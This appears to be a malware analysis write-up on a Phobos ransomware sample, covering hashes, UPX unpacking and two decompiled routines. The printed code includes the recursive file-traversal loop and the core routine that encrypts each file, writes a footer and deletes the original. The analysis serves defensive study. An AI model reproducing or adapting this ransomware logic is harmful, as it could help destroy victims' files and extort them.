# Phobos Ransomware family VXUG version

* [https://app.any.run/tasks/6dffcbde-ca2b-45c2-9a91-6c01975b69a8/](https://app.any.run/tasks/6dffcbde-ca2b-45c2-9a91-6c01975b69a8/)

## Introduction

Phobos ransomware is a malicious software that has gained notoriety in the world of cyber threats. This ransomware strain is designed to encrypt a victim's files and demand a ransom payment in exchange for the decryption key. In this article, we will explore the key characteristics and impact of Phobos ransomware.

## File information

* **Analysis date:** December 07, 2023 at 18:58:53
* **OS:** Windows 10 Professional (build: 19044, 64 bit)
* **Tags:** ransomware
* **File info:** PE32 executable (GUI) Intel 80386, for MS Windows, UPX compressed
* **MD5:** 1CEBF0114B0D9D55A9BE7E4448052033
* **SHA256:** 763B04EF2D0954C7ECF394249665BCD71EEAFEBC3A66A27B010F558FD59DBDEB

## Decompression

We will utilize UPX (Ultimate Packer for Executables) to decompress the malware. UPX is a popular open-source executable packer that is commonly used by malware authors to compress and obfuscate their code. By decompressing the malware using UPX, we aim to reveal the original code and gain a deeper understanding of its functionality and potential threat.

```
C:\ptktools\upx>upx -d phobos-vxug.exe -o phobos-vxug-decompress.exe
                       Ultimate Packer for eXecutables
                          Copyright (C) 1996 - 2022
UPX 4.0.1       Markus Oberhumer, Laszlo Molnar & John Reiser   Nov 16th 2022

        File size         Ratio      Format      Name
   --------------------   ------   -----------   -----------
     68096 <-     51712   75.94%    win32/pe     phobos-vxug-decompress.exe

Unpacked 1 file.

C:\ptktools\upx>dir phobos*
 Volume in drive C is Windows X-Lite
 Volume Serial Number is EA0A-B8C4

 Directory of C:\ptktools\upx

12/04/2023  06:24 AM            68,096 phobos-vxug-decompress.exe
12/04/2023  06:24 AM            51,712 phobos-vxug.exe
               2 File(s)        119,808 bytes
               0 Dir(s)  159,802,298,368 bytes free
```

## Files Search Process

The specific part of the code that handles the loop iterating over all the files. This loop is centered around the use of `FindFirstFileW` and `FindNextFileW` functions, which are used to traverse files in a directory on Windows.

The loop starts after a successful call to `FindFirstFileW` and continues as long as `FindNextFileW` finds new files. Here's the code for this loop:

```cpp
hFindFile = FindFirstFileW(v6, &FindFileData);
if (hFindFile != (HANDLE)-1) {
    do {
        // Skip the "." and ".." entries
        if (FindFileData.cFileName[0] != 46
            || FindFileData.cFileName[1] && (FindFileData.cFileName[1] != 46 || FindFileData.cFileName[2])) {

            // Build the complete file path and call function `a2`
            v7 = sub_4090C6(a1);
            if (a4 >= v7 + sub_4090C6(FindFileData.cFileName) + 1) {
                sub_40927D(v6, a1);
                sub_4092B4(v6, &unk_40A208);
                sub_4092B4(v6, FindFileData.cFileName);
                v8 = a2(a1, v6, &FindFileData, a3);

                // Handle the return from function `a2`
                if (v8) {
                    if (v8 < 0)
                        break;
                    if (a5 && (FindFileData.dwFileAttributes & 0x10) != 0) {
                        v9 = sub_405D61(v6, a2, a3, a4, a5 - 1);
                        v13 += v9;
                    } else {
                        ++v13;
                    }
                }
            }
        }
    } while (FindNextFileW(hFindFile, &FindFileData));
    FindClose(hFindFile);
}
```

Explanation of the loop:

-   **File Searching**: `FindFirstFileW` starts the search, and `FindNextFileW` continues the search until there are no more files.
    
-   **Filtering**: The loop skips the "." and ".." directory entries, which represent the current directory and the parent directory, respectively.
    
-   **Path Building**: For each file, the code constructs its full path using the functions `sub_40927D` and `sub_4092B4`.
    
-   **Calling function `a2`**: The function `a2` is called with the file path, among other parameters.
    
-   **Handling the return from `a2`**: Depending on the return of `a2`, the loop may prematurely end, make a recursive call to `sub_405D61` (if the file is a directory and `a5` is positive), or simply increment the counter `v13`.
    
-   **Closing the File Search**: After the end of the loop, `FindClose` is called to close the file search handle.

## Modification of file process

```cpp
int __usercall sub_408782@<eax>(_DWORD *a1@<eax>, _BYTE *a2, LPCWSTR lpFileName, LPCWSTR a4, char a5)
{
  int v6; // eax
  _DWORD *v7; // ebx
  int v8; // eax
  int v9; // edi
  HANDLE FileW; // eax
  int v11; // ebx
  int v13; // [esp-Ch] [ebp-2A4h]
  _BYTE *v14; // [esp-8h] [ebp-2A0h]
  int v15; // [esp-4h] [ebp-29Ch]
  char v16[296]; // [esp+10h] [ebp-288h] BYREF
  char v17[300]; // [esp+138h] [ebp-160h] BYREF
  int v18; // [esp+264h] [ebp-34h]
  _BYTE *v19; // [esp+268h] [ebp-30h]
  _DWORD *v20; // [esp+26Ch] [ebp-2Ch]
  DWORD NumberOfBytesWritten; // [esp+270h] [ebp-28h] BYREF
  int v22; // [esp+274h] [ebp-24h]
  int v23; // [esp+278h] [ebp-20h]
  DWORD dwFlagsAndAttributes; // [esp+27Ch] [ebp-1Ch]
  LARGE_INTEGER liDistanceToMove; // [esp+280h] [ebp-18h] BYREF
  DWORD nNumberOfBytesToRead; // [esp+288h] [ebp-10h]
  DWORD nNumberOfBytesToWrite; // [esp+28Ch] [ebp-Ch] BYREF
  HANDLE hFile; // [esp+290h] [ebp-8h]
  HANDLE hObject; // [esp+294h] [ebp-4h]

  v23 = 0;
  nNumberOfBytesToRead = a1[9] - (a1[9] & 0xF);
  v19 = (_BYTE *)sub_408601(lpFileName);
  v6 = sub_4090C6(v19);
  v7 = (_DWORD *)a1[8];
  v18 = 2 * v6 + 2;
  v20 = v7 + 8;
  if ( ((2 * (_BYTE)v6 + 34) & 0xF) != 0 )
    v8 = 32 - ((2 * (_BYTE)v6 + 34) & 0xF) + 2 * v6 + 2 + 16;
  else
    v8 = 2 * v6 + 34;
  v22 = v8;
  v9 = (int)v7 + v8;
  hObject = (HANDLE)-1;
  dwFlagsAndAttributes = GetFileAttributesW(lpFileName);
  if ( nNumberOfBytesToRead >= v9 - a1[8] + 178 && GetFileAttributesW(a4) == -1 )
  {
    FileW = CreateFileW(lpFileName, 0xC0000000, 0, 0, 3u, 0, 0);
    hFile = FileW;
    if ( FileW != (HANDLE)-1 )
    {
      liDistanceToMove.QuadPart = 0i64;
      if ( SetFilePointerEx(FileW, 0i64, &liDistanceToMove, 2u) )
      {
        if ( liDistanceToMove.QuadPart )
        {
          liDistanceToMove.QuadPart = 0i64;
          if ( SetFilePointerEx(hFile, 0i64, &liDistanceToMove, 0) )
          {
            hObject = CreateFileW(a4, 0x40000000u, 1u, 0, 1u, dwFlagsAndAttributes, 0);
            if ( hObject != (HANDLE)-1 && !sub_40669B(v16, *a1, a2) )
            {
              while ( ReadFile(hFile, (LPVOID)a1[8], nNumberOfBytesToRead, &nNumberOfBytesToWrite, 0) )
              {
                if ( nNumberOfBytesToWrite < nNumberOfBytesToRead )
                {
                  dwFlagsAndAttributes = 16 - (nNumberOfBytesToWrite & 0xF);
                  sub_408FA9((char *)(nNumberOfBytesToWrite + a1[8]), 0, dwFlagsAndAttributes);
                  nNumberOfBytesToWrite += dwFlagsAndAttributes;
                }
                if ( !sub_406432((int)v16, a1[8], a1[8])
                  || !WriteFile(hObject, (LPCVOID)a1[8], nNumberOfBytesToWrite, &NumberOfBytesWritten, 0)
                  || NumberOfBytesWritten != nNumberOfBytesToWrite )
                {
                  break;
                }
                if ( nNumberOfBytesToWrite < nNumberOfBytesToRead )
                {
                  v15 = v18;
                  *v7 = 0;
                  v14 = v19;
                  v7[1] = 2;
                  v13 = (int)v20;
                  v7[2] = -257466862;
                  v7[6] = 32;
                  sub_408FD7(v13, v14, v15);
                  sub_408FD7(v9, (_BYTE *)a1 + 4, 20);
                  sub_408FD7(v9 + 20, a2, 16);
                  sub_408FD7(v9 + 40, (_BYTE *)(*a1 + 32), 128);
                  sub_408FD7(v9 + 172, (_BYTE *)a1 + 24, 6);
                  v11 = v22;
                  *(_DWORD *)(v9 + 36) = dwFlagsAndAttributes;
                  *(_DWORD *)(v9 + 168) = v11 + 178;
                  if ( !sub_40669B(v17, *a1, a2) )
                  {
                    if ( sub_406432((int)v17, a1[8], a1[8]) )
                    {
                      sub_408FA9(v17, 0, 0x128u);
                      if ( WriteFile(hObject, (LPCVOID)a1[8], *(_DWORD *)(v9 + 168), &NumberOfBytesWritten, 0) )
                      {
                        if ( NumberOfBytesWritten == *(_DWORD *)(v9 + 168) )
                        {
                          if ( (a5 & 4) != 0 )
                            sub_4086B7(hFile);
                          if ( (a5 & 2) != 0 )
                          {
                            FlushFileBuffers(hFile);
                            FlushFileBuffers(hObject);
                          }
                          v23 = 1;
                        }
                      }
                    }
                  }
                  break;
                }
              }
              sub_408FA9(v16, 0, 0x128u);
            }
          }
        }
      }
      CloseHandle(hFile);
      if ( hObject != (HANDLE)-1 )
        CloseHandle(hObject);
      if ( v23 )
      {
        DeleteFileW(lpFileName);
      }
      else if ( hObject != (HANDLE)-1 )
      {
        DeleteFileW(a4);
      }
    }
  }
  return v23;
}
```

This function, named `sub_408782`, performs several operations on files.

1.  **Local Variable Declarations**: The function starts by declaring a number of local variables, including integers, character arrays, `HANDLE`s, and other Windows-specific types.
    
2.  **Initialization and Value Calculations**:
    
    -   It initializes `nNumberOfBytesToRead` based on a field from the `a1` parameter.
    -   It calls `sub_408601` and `sub_4090C6` with `lpFileName`, likely to get some information or transform this filename in a specific way.
3.  **Checking Conditions before Proceeding**:
    
    -   It checks certain conditions regarding the read size and attributes of the files (named `lpFileName` and `a4`).
4.  **Opening the Source File**:
    
    -   If the conditions are met, it opens the source file (`lpFileName`) for reading.
5.  **Creating or Opening the Destination File**:
    
    -   It then attempts to create or open the destination file (`a4`).
6.  **Read and Write Loop**:
    
    -   If the files are successfully opened, it enters a loop where it reads from the source file and writes to the destination file.
    -   It seems to also perform adjustments to data block sizes and possibly encoding or formatting.
7.  **End-of-File Processing**:
    
    -   After finishing processing the file content, it performs some final processing, which includes updating some data and writing a final data block to the destination file.
8.  **Handle Management and Cleanup**:
    
    -   The function closes the `HANDLE`s of the opened files and, depending on the success of the operations, might delete either the source or the destination file.
9.  **Return**:
    
    -   The function returns a value (`v23`), which is likely an indicator of the success or failure of the operations performed.

